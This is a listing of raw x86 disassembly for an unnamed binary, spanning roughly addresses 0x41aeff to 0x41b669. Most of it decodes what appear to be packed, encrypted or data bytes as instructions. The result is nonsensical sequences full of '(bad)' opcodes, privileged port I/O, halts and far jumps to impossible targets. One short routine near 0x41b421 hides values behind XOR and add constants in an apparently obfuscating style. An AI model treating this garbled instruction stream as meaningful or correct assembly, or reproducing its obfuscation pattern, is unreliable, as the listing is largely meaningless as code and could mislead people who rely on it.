  41aeff:	arpl   WORD PTR [esi],di
  41af01:	jmp    0x7e388a3c
  41af06:	cmc    
  41af07:	mov    ebp,0xf1d831c0
  41af0c:	xchg   edx,eax
  41af0d:	sbb    BYTE PTR [edx],cl
  41af0f:	gs add ah,al
  41af12:	dec    edi
  41af13:	das    
  41af14:	add    esp,DWORD PTR [eax]
  41af16:	int    0x9a
  41af18:	mov    ds:0x279c9a58,al
  41af1d:	adc    DWORD PTR [ebp+0x78],esp
  41af20:	mov    ecx,DWORD PTR [ebp-0x5009c7f0]
  41af26:	pop    edx
  41af27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af28:	pop    esp
  41af29:	into   
  41af2a:	jmp    0x41af9f
  41af2c:	xor    BYTE PTR [ebx+0x16f9a70f],dh
  41af32:	stc    
  41af33:	inc    edx
  41af34:	mov    edx,0xb266fd45
  41af39:	lock lahf 
  41af3b:	sbb    esp,esi
  41af3d:	icebp  
  41af3e:	xchg   ecx,eax
  41af3f:	xchg   edx,eax
  41af40:	inc    esi
  41af41:	gs call 0x2578:0x206ae56a
  41af49:	popa   
  41af4a:	fsubr  st(3),st
  41af4c:	js     0x41aeef
  41af4e:	jbe    0x41af64
  41af50:	(bad)  
  41af51:	jb     0x41af41
  41af53:	jae    0x41af72
  41af55:	aad    0x28
  41af57:	in     eax,dx
  41af58:	neg    BYTE PTR [edx+0x6681382]
  41af5e:	cmp    DWORD PTR gs:[esi+0xe],ebp
  41af62:	cmp    edx,DWORD PTR [ebp+0x270bc639]
  41af68:	dec    ebx
  41af69:	adc    DWORD PTR [edx],esp
  41af6b:	sbb    eax,0x1652ecfa
  41af70:	rcr    ch,1
  41af72:	and    al,0xe
  41af74:	xchg   dl,ah
  41af76:	inc    ecx
  41af77:	std    
  41af78:	dec    edx
  41af79:	sub    eax,0xb7195ab0
  41af7e:	fidivr DWORD PTR [ebp-0x4705bfa9]
  41af84:	mov    dl,0xa7
  41af86:	xrelease xchg BYTE PTR ss:[eax-0x4c],bh
  41af8b:	mov    al,ds:0xca87face
  41af90:	and    eax,0x92c28d7c
  41af95:	adc    ebx,ebx
  41af97:	out    dx,al
  41af98:	jo     0x41afa4
  41af9a:	imul   ecx,DWORD PTR [edi+edx*4],0x7097a2ad
  41afa1:	lods   eax,DWORD PTR ds:[esi]
  41afa2:	and    ah,BYTE PTR [esi+0x3af7a7db]
  41afa8:	mov    WORD PTR [edi],ds
  41afaa:	mov    DWORD PTR [edx-0x79],edx
  41afad:	retf   
  41afae:	jmp    0x41b1e3
  41afb3:	(bad)
  41afb6:	int    0xd4
  41afb8:	int    0xd9
  41afba:	fnstcw WORD PTR [edi+0x5e181003]
  41afc0:	cmp    ecx,DWORD PTR [ebp-0x2d]
  41afc3:	adc    dh,bl
  41afc5:	jg     0x41b03f
  41afc7:	adc    BYTE PTR [esi+0x78],bh
  41afca:	js     0x41afb3
  41afcc:	stc    
  41afcd:	pusha  
  41afce:	loopne 0x41af5a
  41afd0:	es mov esp,0x4487b9bc
  41afd6:	mov    al,ds:0x6b1d0794
  41afdb:	ins    BYTE PTR es:[edi],dx
  41afdc:	mov    dh,0xad
  41afde:	add    al,0x8b
  41afe0:	xor    bh,bl
  41afe2:	xchg   BYTE PTR [esi],cl
  41afe4:	aas    
  41afe5:	jmp    0xd84b:0x8580d0
  41afec:	sti    
  41afed:	lahf   
  41afee:	sub    bh,BYTE PTR [esp+edx*8-0x19]
  41aff2:	mov    ds:0xa6f3c216,eax
  41aff7:	mov    ds:0x4c68281b,eax
  41affc:	xor    DWORD PTR [ebp+0x3548070],edi
  41b002:	inc    ecx
  41b003:	repnz cmc 
  41b005:	push   ebp
  41b006:	hlt    
  41b007:	dec    ebp
  41b008:	xor    eax,0xb2ae1fac
  41b00d:	test   DWORD PTR [edx-0x6b],eax
  41b010:	sub    BYTE PTR [ebx-0x34],al
  41b013:	leave  
  41b014:	and    bh,BYTE PTR es:[edx-0x731714f9]
  41b01b:	(bad)  
  41b01c:	es xchg ebp,eax
  41b01e:	in     al,0xde
  41b020:	loop   0x41affa
  41b022:	pop    esp
  41b023:	xor    BYTE PTR [ebx],al
  41b025:	(bad)  
  41b026:	push   ds
  41b027:	push   edx
  41b028:	(bad)  
  41b029:	fwait
  41b02a:	out    dx,eax
  41b02b:	sub    bl,BYTE PTR [edx]
  41b02d:	jnp    0x41afb1
  41b02f:	rcr    al,1
  41b031:	xchg   ebp,eax
  41b032:	sub    bl,BYTE PTR [edx-0x13]
  41b035:	mov    ebp,0x1f82a652
  41b03a:	(bad)  
  41b03b:	jmp    DWORD PTR [eax+0x285fbcac]
  41b041:	dec    edi
  41b042:	mov    ecx,0xde6780e1
  41b047:	dec    ebp
  41b048:	fdivr  DWORD PTR [ecx-0x6c]
  41b04b:	lods   eax,DWORD PTR ds:[esi]
  41b04c:	imul   esi,DWORD PTR es:[edi],0x821d18ac
  41b053:	call   0xeccf3a6b
  41b058:	addr16 jo 0x41b051
  41b05b:	jp     0x41affc
  41b05d:	xchg   ecx,eax
  41b05e:	mov    dl,0xa4
  41b060:	mov    bl,0x3
  41b062:	(bad)  
  41b063:	sbb    ah,BYTE PTR [ebp+eax*1+0x111ba97]
  41b06a:	xchg   esp,eax
  41b06c:	std    
  41b06d:	dec    ecx
  41b06e:	stos   DWORD PTR es:[edi],eax
  41b06f:	pop    esp
  41b070:	jb     0x41b033
  41b072:	or     DWORD PTR [eax],ecx
  41b074:	dec    edx
  41b075:	enter  0x6af4,0x54
  41b079:	outs   dx,DWORD PTR ds:[esi]
  41b07a:	inc    eax
  41b07b:	and    eax,0x2d21777a
  41b080:	loope  0x41b046
  41b082:	push   edi
  41b083:	and    cl,BYTE PTR [esi-0x7d]
  41b086:	out    0x49,eax
  41b088:	jge    0x41b063
  41b08a:	aad    0x69
  41b08c:	add    dh,BYTE PTR [ecx-0xfd95553]
  41b092:	sub    BYTE PTR [esi-0x7bf2faa4],ch
  41b098:	fnstcw WORD PTR [eax]
  41b09a:	push   ecx
  41b09b:	jbe    0x41b0bf
  41b09d:	pop    ecx
  41b09e:	or     eax,0x3de545c5
  41b0a3:	(bad)  [esp+esi*1]
  41b0a6:	pop    ds
  41b0a7:	pushf  
  41b0a8:	imul   edx,ebp,0x1
  41b0ab:	xchg   esp,eax
  41b0ac:	(bad)  
  41b0ad:	nop
  41b0ae:	addr16 test eax,0x99ec716f
  41b0b4:	mov    ds:0x9e930b07,al
  41b0b9:	xor    DWORD PTR [edi],ebx
  41b0bb:	cmp    bh,BYTE PTR [edi+0x1ff8437d]
  41b0c1:	pop    ebx
  41b0c2:	mov    edx,DWORD PTR [ebx]
  41b0c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0c5:	jge    0x41b0a9
  41b0c7:	int    0x78
  41b0c9:	repz shl eax,0x35
  41b0cd:	xchg   ebp,edx
  41b0cf:	inc    edi
  41b0d0:	mov    ah,0x4d
  41b0d2:	and    edx,DWORD PTR [eax+0x70]
  41b0d5:	push   ds
  41b0d6:	cld    
  41b0d7:	(bad)  
  41b0d8:	adc    DWORD PTR [ecx+edx*2],ecx
  41b0db:	ja     0x41b098
  41b0dd:	ds add dh,dh
  41b0e0:	cli    
  41b0e1:	movups xmm6,xmm0
  41b0e4:	inc    edx
  41b0e5:	cmp    BYTE PTR [esi+0x30],ch
  41b0e8:	adc    al,0xe4
  41b0ea:	js     0x41b081
  41b0ec:	nop
  41b0ed:	mov    bl,0xbd
  41b0ef:	inc    ecx
  41b0f0:	dec    esp
  41b0f1:	in     eax,0x26
  41b0f3:	outs   dx,DWORD PTR ds:[esi]
  41b0f4:	mov    ah,0xea
  41b0f6:	xchg   ebp,eax
  41b0f7:	xor    bl,ch
  41b0f9:	or     eax,0x157ea319
  41b0fe:	cdq    
  41b0ff:	leave  
  41b100:	fwait
  41b101:	lods   al,BYTE PTR ds:[esi]
  41b102:	xchg   esi,eax
  41b103:	cmp    bh,cl
  41b105:	add    edi,esi
  41b107:	pop    esp
  41b108:	jbe    0x41b175
  41b10a:	pop    ss
  41b10b:	out    0x8f,al
  41b10d:	pop    ebx
  41b10e:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41b110:	inc    eax
  41b111:	adc    edx,DWORD PTR [edx]
  41b113:	and    ecx,DWORD PTR [edi+ebx*8+0x20b73d02]
  41b11a:	call   0xefd107e9
  41b11f:	sbb    eax,edi
  41b121:	mov    edx,0xf6cf9a0f
  41b126:	push   es
  41b127:	xchg   esp,eax
  41b128:	xchg   ecx,eax
  41b129:	cmc    
  41b12a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b12b:	pop    ss
  41b12c:	or     bh,BYTE PTR [eax]
  41b12e:	mov    ch,ah
  41b130:	jbe    0x41b150
  41b132:	aad    0xc3
  41b134:	sbb    BYTE PTR [ebp-0x46],ah
  41b137:	arpl   bp,ax
  41b139:	jnp    0x41b177
  41b13b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b13c:	icebp  
  41b13d:	mov    ah,0x2a
  41b13f:	stos   BYTE PTR es:[edi],al
  41b140:	or     DWORD PTR [edx],esp
  41b142:	mov    ebp,0x83cb914f
  41b147:	push   esp
  41b148:	dec    edi
  41b149:	jns    0x41b129
  41b14b:	dec    ebp
  41b14c:	stos   DWORD PTR es:[edi],eax
  41b14d:	mov    ?,esp
  41b14f:	pop    ebp
  41b150:	fisttp QWORD PTR [ebx+ebp*2+0x3a8670]
  41b157:	mov    ah,cl
  41b159:	sub    eax,0x6f1077c5
  41b15e:	iret   
  41b15f:	and    dh,dl
  41b161:	push   ebp
  41b162:	cmp    ah,bl
  41b164:	stc    
  41b165:	and    ah,BYTE PTR [ebp-0x67eda4f5]
  41b16b:	cld    
  41b16c:	add    al,0x95
  41b16e:	clc    
  41b16f:	out    dx,eax
  41b170:	push   edx
  41b171:	sti    
  41b172:	push   cs
  41b173:	loope  0x41b1ba
  41b175:	ffree  st(0)
  41b177:	push   eax
  41b178:	xchg   edx,eax
  41b179:	cli    
  41b17a:	inc    edi
  41b17b:	retf   
  41b17c:	xchg   ebx,eax
  41b17d:	ret    
  41b17e:	xchg   ebx,eax
  41b17f:	ret    0x275
  41b182:	dec    ebx
  41b183:	xchg   edx,eax
  41b184:	lock dec edx
  41b186:	and    DWORD PTR [edi+0x72],0x81a77d02
  41b18d:	mov    eax,0xa4f86b71
  41b192:	mov    ds:0x6593e1e8,al
  41b197:	imul   eax,DWORD PTR [ebx],0x4624a8ab
  41b19d:	inc    ecx
  41b19e:	push   cx
  41b1a0:	mov    bh,0x9e
  41b1a2:	dec    ebp
  41b1a3:	imul   esp,DWORD PTR [ecx+0x5d896f3d],0x5710c1ff
  41b1ad:	mov    ecx,0x3e917aba
  41b1b2:	outs   dx,DWORD PTR ds:[esi]
  41b1b3:	ja     0x41b1c1
  41b1b5:	mov    ecx,0x5f4d3462
  41b1ba:	dec    esp
  41b1bb:	cmp    BYTE PTR [edx+0x48470136],bh
  41b1c1:	outs   dx,BYTE PTR ds:[esi]
  41b1c2:	adc    DWORD PTR [ebp+0x35692ed4],ebp
  41b1c8:	(bad)  {k1}{z}
  41b1cd:	inc    ecx
  41b1ce:	outs   dx,BYTE PTR ds:[esi]
  41b1cf:	pushf  
  41b1d0:	xlat   BYTE PTR ds:[ebx]
  41b1d1:	push   cs
  41b1d2:	mov    ecx,ecx
  41b1d4:	je     0x41b1a7
  41b1d6:	arpl   bp,di
  41b1d8:	ja     0x41b1ff
  41b1da:	sti    
  41b1db:	mov    ah,0xe6
  41b1dd:	jp     0x41b189
  41b1df:	or     edx,DWORD PTR [edi+0x2]
  41b1e2:	mov    ecx,DWORD PTR [ecx-0x75]
  41b1e5:	inc    ebp
  41b1e6:	in     al,0xe9
  41b1e8:	xor    BYTE PTR [edx],al
  41b1ea:	add    BYTE PTR [eax],al
  41b1ec:	iret   
  41b1ed:	enter  0xd0d3,0xd3
  41b1f1:	fcmovnu st,st(3)
  41b1f3:	xlat   BYTE PTR ds:[ebx]
  41b1f4:	push   esp
  41b1f5:	rcl    BYTE PTR ss:[bx+0x1d2f],0xc4
  41b1fc:	sub    ah,bl
  41b1fe:	jg     0x41b278
  41b200:	adc    BYTE PTR [esi+0x78],bh
  41b203:	js     0x41b22a
  41b205:	jg     0x41b225
  41b207:	jbe    0x41b220
  41b209:	rcl    BYTE PTR [edx-0x385766cf],1
  41b20f:	nop    DWORD PTR ss:[edi-0x14791a85]
  41b217:	rol    BYTE PTR [ebx],1
  41b219:	sbb    BYTE PTR [ebx],ch
  41b21b:	xchg   ecx,eax
  41b21c:	addr16 sub eax,0x3cb4f410
  41b222:	pop    edi
  41b223:	stos   BYTE PTR es:[edi],al
  41b224:	sub    dh,BYTE PTR [eax]
  41b226:	jecxz  0x41b278
  41b228:	imul   ebp,edx,0x3d
  41b22b:	bound  edx,QWORD PTR [ebp-0x1ff0e704]
  41b231:	out    0x4c,al
  41b233:	or     DWORD PTR [edi+0x541a1741],edx
  41b239:	pop    edi
  41b23a:	les    eax,FWORD PTR [eax-0x764acd29]
  41b240:	and    ch,BYTE PTR [ebp+0x35299e59]
  41b246:	xor    ebp,DWORD PTR [edx+esi*8+0xaf99f37]
  41b24d:	lods   al,BYTE PTR ds:[esi]
  41b24e:	into   
  41b24f:	xchg   BYTE PTR [ecx+0x10d29c2c],bl
  41b255:	jle    0x41b207
  41b257:	loop   0x41b28c
  41b259:	call   0xfa31c10b
  41b25e:	xchg   edx,eax
  41b25f:	inc    esp
  41b260:	and    eax,0x5a41a2eb
  41b265:	mov    ah,0xd5
  41b267:	or     dh,BYTE PTR [esi+0x3b85507e]
  41b26d:	and    al,0x12
  41b26f:	fs inc ebp
  41b271:	or     ch,al
  41b273:	mov    ebp,0x3f75ec12
  41b278:	xchg   ebx,eax
  41b279:	and    edx,edx
  41b27b:	dec    ebp
  41b27c:	cmp    DWORD PTR [edx-0x5c],eax
  41b27f:	sbb    dl,BYTE PTR fs:[ecx+edi*1]
  41b283:	sub    dl,BYTE PTR [esi]
  41b285:	adc    eax,0x72728e32
  41b28a:	add    cl,cl
  41b28c:	push   ds
  41b28d:	push   edi
  41b28e:	and    eax,DWORD PTR [edi+0x3a]
  41b291:	call   0xa05e:0x73469c26
  41b298:	leave  
  41b299:	ja     0x41b220
  41b29b:	out    0xa8,eax
  41b29d:	sub    eax,0x34a63521
  41b2a2:	jns    0x41b25f
  41b2a4:	xor    ebx,eax
  41b2a6:	sub    ebx,DWORD PTR [ebx+0xd]
  41b2a9:	and    DWORD PTR [edx+0x18],0xffba596a
  41b2b0:	xor    cl,BYTE PTR [ebx-0x4b]
  41b2b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2b4:	or     ebx,DWORD PTR [edx+0x29583614]
  41b2ba:	push   eax
  41b2bb:	fwait
  41b2bc:	pop    eax
  41b2bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2be:	cwde   
  41b2bf:	inc    esp
  41b2c0:	pop    edx
  41b2c1:	mov    ds:0x8e51c7d7,eax
  41b2c6:	mov    bl,0xa
  41b2c8:	cmp    dh,0x77
  41b2cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2cc:	unpckhps xmm5,XMMWORD PTR [ebp-0x6a]
  41b2d0:	(bad)  
  41b2d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2d2:	sahf   
  41b2d3:	in     eax,dx
  41b2d4:	and    cl,ch
  41b2d6:	pop    esi
  41b2d7:	and    eax,0x718212b3
  41b2dc:	sbb    BYTE PTR [ebx-0x44],ah
  41b2df:	push   ecx
  41b2e0:	sbb    BYTE PTR [esi+0x19724ebc],cl
  41b2e6:	jp     0x41b28d
  41b2e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2e9:	test   eax,0x4e23f4fc
  41b2ee:	pop    esi
  41b2ef:	cs pop ss
  41b2f1:	inc    ecx
  41b2f2:	pushf  
  41b2f3:	sar    BYTE PTR [ecx],0xf9
  41b2f6:	or     bl,al
  41b2f8:	mov    ch,0x83
  41b2fa:	and    ebp,DWORD PTR [eax]
  41b2fc:	inc    ebx
  41b2fd:	ss out dx,eax
  41b2ff:	mov    al,0x31
  41b301:	arpl   WORD PTR [ecx+0x1254ae6e],sp
  41b307:	jmp    0x452bba6b
  41b30c:	jecxz  0x41b354
  41b30e:	mov    dh,0x4b
  41b310:	and    eax,0x215727d2
  41b315:	repz shl DWORD PTR [edi],cl
  41b318:	in     al,dx
  41b319:	push   ebp
  41b31a:	sbb    al,0xbb
  41b31c:	sbb    ah,BYTE PTR [esi+0x2e]
  41b31f:	enter  0x1eb4,0xc9
  41b323:	cmp    DWORD PTR [eax+edx*2-0x51d39f56],ecx
  41b32a:	sahf   
  41b32b:	adc    dh,BYTE PTR [esi-0x45]
  41b32e:	sub    ch,dl
  41b330:	rcl    BYTE PTR [eax+0x5e9ac84f],1
  41b336:	inc    esp
  41b337:	cdq    
  41b338:	test   DWORD PTR [eax+0x7f],ecx
  41b33b:	test   DWORD PTR [ebx],ebp
  41b33d:	fcomp  st(5)
  41b33f:	xchg   BYTE PTR [ebp-0x7d],ah
  41b342:	jmp    0xfba7:0xbf7da9ca
  41b349:	mov    eax,ds:0xc56923c9
  41b34e:	je     0x41b367
  41b350:	je     0x41b348
  41b352:	cmp    eax,0x76261596
  41b357:	arpl   WORD PTR [ecx+0x70],si
  41b35a:	neg    bh
  41b35c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b35d:	jns    0x41b3c0
  41b35f:	inc    esp
  41b360:	push   edi
  41b361:	addr16 in al,dx
  41b363:	loope  0x41b30a
  41b365:	popa   
  41b366:	jns    0x41b39a
  41b368:	sub    DWORD PTR [edi],ebp
  41b36a:	lds    eax,FWORD PTR [eax-0x64]
  41b36d:	sub    cl,bh
  41b36f:	push   esp
  41b370:	repz inc eax
  41b372:	dec    ebx
  41b373:	test   BYTE PTR ds:0x34d58822,al
  41b379:	dec    esi
  41b37a:	loope  0x41b3b5
  41b37c:	dec    edx
  41b37d:	pop    es
  41b37e:	lahf   
  41b37f:	pop    ss
  41b380:	inc    esp
  41b381:	adc    eax,0x2506a33f
  41b386:	mov    eax,ds:0x132e59d9
  41b38b:	data16 fldln2 
  41b38e:	(bad)  
  41b38f:	sti    
  41b390:	nop
  41b391:	inc    edx
  41b392:	aas    
  41b393:	je     0x41b3b3
  41b395:	test   DWORD PTR [esi-0x12bb3af2],ecx
  41b39b:	sub    al,0x7a
  41b39d:	int3   
  41b39e:	daa    
  41b39f:	fadd   DWORD PTR [ebp-0x18a76d5e]
  41b3a5:	or     BYTE PTR [ebx],ch
  41b3a7:	sahf   
  41b3a8:	cdq    
  41b3a9:	inc    esi
  41b3aa:	fwait
  41b3ab:	cmp    ch,dl
  41b3ad:	mov    cl,0x48
  41b3af:	in     eax,dx
  41b3b0:	nop
  41b3b1:	pop    eax
  41b3b2:	cmp    esp,ebx
  41b3b4:	xlat   BYTE PTR ds:[ebx]
  41b3b5:	cmp    cl,BYTE PTR [ebx-0x6ad22e22]
  41b3bb:	xchg   al,dh
  41b3bd:	stos   DWORD PTR es:[edi],eax
  41b3be:	pusha  
  41b3bf:	mov    DWORD PTR [esi+0x506b1633],edx
  41b3c5:	sub    esi,esp
  41b3c7:	aam    0x4d
  41b3c9:	cmp    bl,ah
  41b3cb:	xchg   ebx,eax
  41b3cc:	ds mov esi,0x20e2a1c6
  41b3d2:	outs   dx,BYTE PTR ds:[esi]
  41b3d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3d4:	xlat   BYTE PTR ds:[ebx]
  41b3d5:	aad    0xe8
  41b3d7:	and    eax,0x7eae8808
  41b3dc:	fild   WORD PTR [ebx]
  41b3de:	sar    bl,0x7a
  41b3e1:	push   esi
  41b3e2:	add    eax,0xd7e0ec17
  41b3e7:	mov    edx,DWORD PTR [eax]
  41b3e9:	ins    BYTE PTR es:[edi],dx
  41b3ea:	cmc    
  41b3eb:	arpl   WORD PTR gs:[edi],di
  41b3ee:	jo     0x41b3bc
  41b3f0:	ret    0xc1ab
  41b3f3:	inc    ecx
  41b3f4:	jae    0x41b3d1
  41b3f6:	(bad)  
  41b3f7:	sbb    ecx,edx
  41b3f9:	ins    DWORD PTR es:[edi],dx
  41b3fa:	test   al,0x58
  41b3fc:	test   BYTE PTR [edi+0x75c183d0],0x53
  41b403:	sahf   
  41b404:	sbb    ch,BYTE PTR [ecx-0x3e99eb74]
  41b40a:	cdq    
  41b40b:	inc    edx
  41b40c:	dec    ebp
  41b40d:	push   ds
  41b40e:	hlt    
  41b40f:	outs   dx,DWORD PTR ds:[esi]
  41b410:	inc    esp
  41b411:	push   ss
  41b412:	pop    es
  41b413:	(bad)  
  41b414:	out    0xb,al
  41b416:	cmp    al,0x87
  41b418:	xor    eax,0xf36e614
  41b41d:	scas   eax,DWORD PTR es:[edi]
  41b41e:	shr    DWORD PTR [ebx],0xe0
  41b421:	mov    DWORD PTR [ebp-0x24],esp
  41b424:	mov    eax,DWORD PTR [ebp-0x4]
  41b427:	mov    ecx,0x7510850
  41b42c:	xor    eax,ecx
  41b42e:	mov    edx,0x327298
  41b433:	add    eax,edx
  41b435:	mov    DWORD PTR [ebp+0x8],eax
  41b438:	mov    eax,DWORD PTR [ebp-0x18]
  41b43b:	xor    eax,ecx
  41b43d:	add    eax,edx
  41b43f:	mov    edx,DWORD PTR [ebp+0x14]
  41b442:	imul   eax,DWORD PTR [edx]
  41b445:	mov    edx,DWORD PTR [ebp-0x4]
  41b448:	xor    edx,ecx
  41b44a:	mov    ecx,DWORD PTR [ebp+0x8]
  41b44d:	lea    ecx,[edx+ecx*1+0x327298]
  41b454:	cmp    ecx,eax
  41b456:	je     0x41bfd6
  41b45c:	mov    edi,DWORD PTR [ebp-0x18]
  41b45f:	mov    eax,DWORD PTR [ebp+0x8]
  41b462:	mov    edx,DWORD PTR [ebp+0x14]
  41b465:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41b469:	mov    ecx,0x7510850
  41b46e:	xor    edx,edx
  41b470:	xor    edi,ecx
  41b472:	mov    esi,0x327298
  41b477:	add    edi,esi
  41b479:	div    edi
  41b47b:	mov    edx,DWORD PTR [ebp-0x4]
  41b47e:	xor    edx,ecx
  41b480:	lea    eax,[edx+eax*1+0x327298]
  41b487:	mov    edx,DWORD PTR [ebp+0x8]
  41b48a:	mov    edi,DWORD PTR [ebp-0x24]
  41b48d:	mov    DWORD PTR [edi+edx*4],eax
  41b490:	mov    eax,DWORD PTR [ebp-0x18]
  41b493:	mov    edx,DWORD PTR [ebp+0x8]
  41b496:	xor    eax,ecx
  41b498:	lea    eax,[eax+edx*1+0x327298]
  41b49f:	mov    DWORD PTR [ebp+0x8],eax
  41b4a2:	mov    eax,DWORD PTR [ebp-0x18]
  41b4a5:	mov    edx,DWORD PTR [ebp+0x14]
  41b4a8:	jmp    0x41b6dd
  41b4ad:	int3   
  41b4ae:	(bad)  
  41b4af:	retf   0xd9d6
  41b4b2:	fxch   st(4)
  41b4b4:	leave  
  41b4b5:	mov    ch,0xbb
  41b4b7:	push   ds
  41b4b8:	hlt    
  41b4b9:	ss xchg edx,eax
  41b4bb:	mov    dh,0xd8
  41b4bd:	shl    dl,0x7f
  41b4c0:	js     0x41b4d2
  41b4c2:	jle    0x41b53c
  41b4c4:	js     0x41b47b
  41b4c6:	lods   al,BYTE PTR ds:[esi]
  41b4c7:	mov    WORD PTR ss:[eax],ds
  41b4ca:	and    ch,bh
  41b4cc:	adc    al,0xef
  41b4ce:	neg    BYTE PTR [ebx]
  41b4d0:	adc    BYTE PTR [ecx+ebp*1-0x21],bl
  41b4d4:	stc    
  41b4d5:	sbb    BYTE PTR ds:0x8456caae,bl
  41b4db:	pop    esp
  41b4dc:	jle    0x41b470
  41b4de:	test   DWORD PTR [ebp+esi*4+0x2c],ebp
  41b4e2:	and    dh,dh
  41b4e4:	adc    ebx,DWORD PTR [edi]
  41b4e6:	cmp    eax,0x409bb74a
  41b4eb:	push   cs
  41b4ec:	call   0x7da6f8f0
  41b4f1:	pop    es
  41b4f2:	pop    ds
  41b4f3:	push   eax
  41b4f4:	dec    ebp
  41b4f5:	cmp    BYTE PTR [edi],0xd3
  41b4f8:	out    dx,eax
  41b4f9:	mov    edi,0x29679390
  41b4fe:	pop    esp
  41b4ff:	jl     0x41b4db
  41b501:	pusha  
  41b502:	mov    esi,0xc70c1a93
  41b507:	retf   
  41b508:	and    al,0xf0
  41b50a:	push   0xf1c81de4
  41b50f:	xchg   ecx,eax
  41b510:	je     0x41b55c
  41b512:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b513:	push   cs
  41b514:	inc    ebp
  41b515:	mov    bx,0xa380
  41b519:	pop    ds
  41b51a:	adc    ah,bl
  41b51c:	(bad)  
  41b51d:	pop    esi
  41b51e:	shl    BYTE PTR [esi+0x19],0xa3
  41b522:	xchg   al,cl
  41b524:	or     eax,0xe25def86
  41b529:	sbb    DWORD PTR ds:0x2cf28ff0,0xffffff8a
  41b530:	xchg   edx,eax
  41b531:	and    esi,esi
  41b533:	std    
  41b534:	popf   
  41b535:	push   0x794f981f
  41b53a:	xchg   ebx,eax
  41b53b:	inc    ebx
  41b53c:	adc    ch,BYTE PTR [ebx-0x34f97b64]
  41b542:	push   edx
  41b543:	or     al,0x28
  41b546:	loop   0x41b4d3
  41b548:	clc    
  41b549:	(bad)  
  41b54a:	pop    esi
  41b54b:	inc    ebx
  41b54c:	jb     0x41b516
  41b54e:	cld    
  41b54f:	jmp    0x2d74:0x5eb0b7cf
  41b556:	aad    0x5e
  41b558:	mov    ecx,0x875f1000
  41b55d:	xor    bl,BYTE PTR [edx+eax*1+0x5645e6d7]
  41b564:	mov    cl,0xb8
  41b566:	add    BYTE PTR ds:0xbd7a9a3e,ch
  41b56c:	daa    
  41b56d:	and    DWORD PTR [ebx],ecx
  41b56f:	int    0x22
  41b571:	adc    edi,DWORD PTR [ebp+0xb91d00a]
  41b577:	mov    al,ah
  41b579:	push   edi
  41b57a:	clc    
  41b57b:	xchg   BYTE PTR [ebp+edi*2+0x10],dh
  41b57f:	inc    ebp
  41b580:	mov    ebp,0xf003f331
  41b585:	clc    
  41b586:	div    DWORD PTR [edi+0x241afbe4]
  41b58c:	jle    0x41b5ec
  41b58e:	(bad)  
  41b58f:	jmp    0x41b546
  41b591:	jae    0x41b5cf
  41b593:	add    eax,0xc2edcf5e
  41b598:	push   ecx
  41b599:	mov    esi,0x9e9699a
  41b59e:	xchg   DWORD PTR ds:0x4dc0e9bf,eax
  41b5a4:	xor    al,0xfd
  41b5a6:	jle    0x41b5a7
  41b5a8:	pop    esp
  41b5a9:	jmp    0x4761:0x91dbc0ae
  41b5b0:	in     al,dx
  41b5b1:	jo     0x41b618
  41b5b3:	je     0x41b5c5
  41b5b5:	ret    
  41b5b6:	test   eax,0x8598ccd3
  41b5bb:	icebp  
  41b5bc:	add    edi,DWORD PTR [ebp-0x2e04fc3e]
  41b5c2:	cli    
  41b5c3:	or     ch,BYTE PTR [ecx+eax*2]
  41b5c6:	adc    al,dl
  41b5c8:	xchg   esp,eax
  41b5c9:	xchg   esp,eax
  41b5ca:	cmp    DWORD PTR [ebx],ebp
  41b5cc:	mov    esp,edx
  41b5ce:	fcmovne st,st(5)
  41b5d0:	push   es
  41b5d1:	inc    edi
  41b5d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5d3:	cli    
  41b5d4:	das    
  41b5d5:	in     eax,dx
  41b5d6:	outs   dx,BYTE PTR es:[esi]
  41b5d8:	sbb    DWORD PTR [eax+0x33ad15f3],ebx
  41b5de:	test   BYTE PTR ds:0x3d5b55cb,bh
  41b5e4:	inc    ebx
  41b5e5:	jbe    0x41b583
  41b5e7:	retf   0x8b7a
  41b5ea:	inc    ebp
  41b5eb:	mov    ecx,0x514f9833
  41b5f0:	scas   al,BYTE PTR es:[edi]
  41b5f1:	cdq    
  41b5f2:	push   0x4f
  41b5f4:	mov    ebx,0xdda8d4cd
  41b5f9:	xor    al,0x37
  41b5fb:	leave  
  41b5fc:	sbb    BYTE PTR [eax],dh
  41b5fe:	dec    esp
  41b5ff:	inc    eax
  41b600:	stc    
  41b601:	inc    ecx
  41b602:	addr16 mov ebx,0x73367f56
  41b608:	repnz push edi
  41b60a:	cmp    BYTE PTR [ebp+0x7],bh
  41b60d:	fs pop edi
  41b60f:	gs nop
  41b611:	mov    ecx,0x195b4122
  41b616:	mov    ecx,0xa35d4756
  41b61b:	push   eax
  41b61c:	mov    esi,0x3dc32b74
  41b621:	cs pop ss
  41b623:	pushf  
  41b624:	call   0x727f:0xe8585838
  41b62b:	cwde   
  41b62c:	or     al,0xbc
  41b62e:	jl     0x41b65d
  41b630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b631:	mov    DWORD PTR [ecx-0x75],0x5a1a2ded
  41b638:	and    DWORD PTR [ebx-0x5ce8cdab],esp
  41b63e:	sbb    DWORD PTR [eax+ecx*8-0x41],esi
  41b642:	ins    DWORD PTR es:[edi],dx
  41b643:	mov    esi,0x56375ec7
  41b648:	popf   
  41b649:	popf   
  41b64a:	arpl   dx,ax
  41b64c:	outs   dx,DWORD PTR ds:[esi]
  41b64d:	in     al,0x4f
  41b64f:	mov    ah,0xc5
  41b651:	(bad)  
  41b653:	or     eax,0xdcb497e1
  41b658:	xor    ch,BYTE PTR [edx+0x1c9f7707]
  41b65e:	mov    esi,0x895ac2e
  41b663:	cmp    bh,0xb6
  41b666:	dec    ecx
  41b667:	in     al,0x47
  41b669:	addr16 cs test ebp,0xecadff6b
